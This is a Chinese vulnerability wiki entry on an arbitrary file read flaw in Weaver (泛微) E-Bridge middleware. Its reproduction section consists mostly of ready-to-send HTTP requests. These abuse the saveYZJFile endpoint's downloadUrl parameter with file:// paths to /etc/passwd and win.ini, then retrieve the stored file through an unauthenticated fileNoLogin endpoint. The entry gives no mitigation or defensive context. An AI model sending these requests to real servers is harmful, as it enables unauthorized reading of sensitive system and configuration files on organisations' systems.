泛微 E-Bridge 云桥任意文件读取
==============================

一、漏洞简介
------------

泛微云桥（E-Bridge）是上海泛微公司在"互联网+"的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。

二、漏洞影响
------------

2018-2019 多个版本。

三、复现过程
------------

### 服务器Linux：

    GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt HTTP/1.1
    Host: www.0-sec.org:8088
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: ecology_JSessionId=abc3I_8E3ZP75a_tnGnrx; testBanCookie=test; JSESSIONID=3kqlxwz8wo04x6cs4dlaovn; EBRIDGE_JSESSIONID=3DD7A4B45D85CAE1AC75F8FF6DEB7556
    Connection: close

![1.png](/Users/aresx/Documents/VulWiki/.resource/泛微E-Bridge云桥任意文件读取/media/rId25.png)

### windows服务器：

    GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C://windows/win.ini&fileExt=txt HTTP/1.1
    Host: www.0-sec.org
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: EBRIDGE_JSESSIONID=182ED2E3025C11EA9ADDC07761F56DBA
    Connection: close

![2.png](/Users/aresx/Documents/VulWiki/.resource/泛微E-Bridge云桥任意文件读取/media/rId27.png)

### 读取文件

    GET /file/fileNoLogin/35acd348e86549ffb33d7f531350391e HTTP/1.1
    Host: www.0-sec.org:8088
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: EBRIDGE_JSESSIONID=BABB53753778ED19791B6F606E5B0D77
    Connection: close

**35acd348e86549ffb33d7f531350391e为上个包返回的id**

![3.png](/Users/aresx/Documents/VulWiki/.resource/泛微E-Bridge云桥任意文件读取/media/rId29.png)
